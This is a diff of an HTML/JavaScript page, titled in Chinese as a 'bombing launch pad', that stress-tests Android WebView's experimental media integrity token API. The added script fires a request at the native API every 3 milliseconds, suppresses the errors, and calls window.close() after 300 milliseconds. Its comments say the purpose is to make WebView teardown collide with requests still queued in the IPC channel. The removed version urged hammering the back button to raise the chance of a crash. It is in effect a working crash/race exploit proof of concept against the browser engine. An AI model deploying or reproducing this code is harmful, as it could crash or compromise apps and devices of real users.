@@ -3,93 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Media Integrity 轰炸发射台</title>
+    <title>轰炸发射台</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 20px; background: #121212; color: #e0e0e0; text-align: center; }
-        .card { background: #1e1e1e; padding: 25px; border-radius: 16px; max-width: 500px; margin: 30px auto; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
-        .status-box { padding: 15px; margin: 15px 0; border-radius: 8px; font-weight: bold; font-size: 14px; text-align: left; background: #2d2d2d; }
-        .found { color: #34C759; border-left: 5px solid #34C759; }
-        .not-found { color: #FF3B30; border-left: 5px solid #FF3B30; }
-        button { width: 100%; padding: 16px; font-size: 16px; background: #FF3B30; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 15px; box-shadow: 0 4px 12px rgba(255,59,48,0.3); }
-        button:disabled { background: #444; color: #888; cursor: not-allowed; box-shadow: none; }
-        .counter { font-size: 28px; font-weight: bold; color: #FFD60A; margin: 15px 0; font-family: monospace; }
-        .log-area { margin-top: 20px; background: #000; padding: 12px; border-radius: 8px; font-family: monospace; font-size: 12px; text-align: left; height: 180px; overflow-y: auto; color: #00FF00; border: 1px solid #333; }
+        body { font-family: sans-serif; background: #1a1a1a; color: #fff; text-align: center; padding: 30px; }
+        .card { background: #262626; padding: 20px; border-radius: 12px; max-width: 400px; margin: 0 auto; }
+        .btn-fire { width: 100%; padding: 16px; background: #FF3B30; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; }
+        .btn-fire:disabled { background: #555; cursor: not-allowed; }
+        .counter { font-size: 32px; color: #FFD60A; font-family: monospace; margin: 20px 0; }
     </style>
 </head>
 <body>
-
     <div class="card">
-        <h2>🔥 Mojom 级压测</h2>
-        <p style="color: #aaa; font-size: 13px; margin-top: -5px;">对齐接口：window.android.webview.getExperimentalMediaIntegrityTokenProvider</p>
-        
-        <div id="scanResult" class="status-box">正在全网扫描 API 挂载点...</div>
-        
-        <div class="counter" id="fireCount">000000</div>
-        
-        <button id="fireBtn" disabled>💥 启动狂暴轰炸并闪现销毁</button>
-        
-        <div class="log-area" id="consoleLog">=== 轰炸日志终端 ===<br></div>
+        <h3>加特林高频发射中...</h3>
+        <div id="status" style="color: #34C759; font-weight: bold; margin-bottom: 10px;">正在检测 API...</div>
+        <div class="counter" id="count">000000</div>
+        <button class="btn-fire" id="fireBtn" disabled>💥 启动轰炸并自动关闭 Tab</button>
     </div>
 
     <script>
-        const scanResultEl = document.getElementById('scanResult');
+        const statusEl = document.getElementById('status');
         const fireBtn = document.getElementById('fireBtn');
-        const logEl = document.getElementById('consoleLog');
-        const fireCountEl = document.getElementById('fireCount');
+        const countEl = document.getElementById('count');
 
-        let totalFired = 0;
-        let bombInterval = null;
+        let total = 0;
+        let timer = null;
 
-        function printLog(msg) {
-            logEl.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
-            logEl.scrollTop = logEl.scrollHeight;
-        }
-
-        // 1. 严格按照 Mojom 规范进行路径检测 (window.android.webview)
-        const hasApi = window.android && 
-                      window.android.webview && 
-                      typeof window.android.webview.getExperimentalMediaIntegrityTokenProvider === 'function';
+        // 1. 验证真身路径
+        const hasApi = window.android && window.android.webview && typeof window.android.webview.getExperimentalMediaIntegrityTokenProvider === 'function';
 
         if (hasApi) {
-            scanResultEl.className = "status-box found";
-            scanResultEl.innerHTML = `🎯 成功捕获正牌接口！<br>路径: window.android.webview.getExperimentalMediaIntegrityTokenProvider`;
+            statusEl.innerText = "✅ 接口已就绪";
             fireBtn.disabled = false;
-            printLog("Mojom 契约达成，随时可以开火。");
         } else {
-            scanResultEl.className = "status-box not-found";
-            scanResultEl.innerHTML = `❌ 未在这个 WebView 内核中发现该实验性 API。<br>请确认内核是否开启了 WebViewMediaIntegrity 的 Feature 开关。`;
-            printLog("错误：未找到指定命名空间或方法。");
+            statusEl.innerText = "❌ 未找到接口";
+            statusEl.style.color = "#FF3B30";
         }
 
-        // 2. 轰炸核心逻辑
+        // 2. 轰炸 + 闪现自毁
         fireBtn.onclick = function() {
             if (!hasApi) return;
-
             fireBtn.disabled = true;
-            printLog("🚀 正在将 Mojo IPC 管道拉满至 100%...");
 
-            // ⚡ 核心：每 3 毫秒疯狂向 Java 层投递一次异步请求，挤爆主线程队列
-            bombInterval = setInterval(function() {
-                totalFired++;
-                // 动态更新前端计数器面板
-                fireCountEl.innerText = String(totalFired).padStart(6, '0');
-
+            // ⚡ 每 3 毫秒盲轰一发，强行塞满原生 IPC 缓冲区
+            timer = setInterval(function() {
+                total++;
+                countEl.innerText = String(total).padStart(6, '0');
+                
                 window.android.webview.getExperimentalMediaIntegrityTokenProvider({
-                    cloudProjectNumber: 123456789 
-                }).catch(function(err) {
-                    // 静默吞掉报错（因为项目号是假的必然报错，但只要进入 Java 目的就达到了）
-                });
-            }, 3); 
+                    cloudProjectNumber: 123456789
+                }).catch(() => {});
+            }, 3);
 
-            printLog("⚠️ 警报：管道已过载！");
-            printLog("⏳ 300ms 后页面将自动强制切回主页销毁 Frame...");
-            printLog("👉 此时你也可以**疯狂猛按手机返回键**以加大崩溃概率！");
-
-            // 🕒 双重保险：300毫秒后自动执行本地跳转，此时 Java 层的销毁和前端队列的余弹会撞车
+            // 🕒 300ms 后准时触发 window.close()
+            // 此时原生层会开始销毁当前 WebView，而 IPC 通道里还留着刚刚发出去的余弹
             setTimeout(function() {
-                printLog("⏰ 倒计时结束，执行强行闪现跳转！");
-                clearInterval(bombInterval);
-                window.location.href = "index.html";
+                clearInterval(timer);
+                statusEl.innerText = "⏳ 正在执行原生强杀...";
+                
+                // 🎯 终极杀招：直接调用标准接口关闭窗口，触发原生 view.destroy()
+                window.close(); 
             }, 300);
         };
     </script>
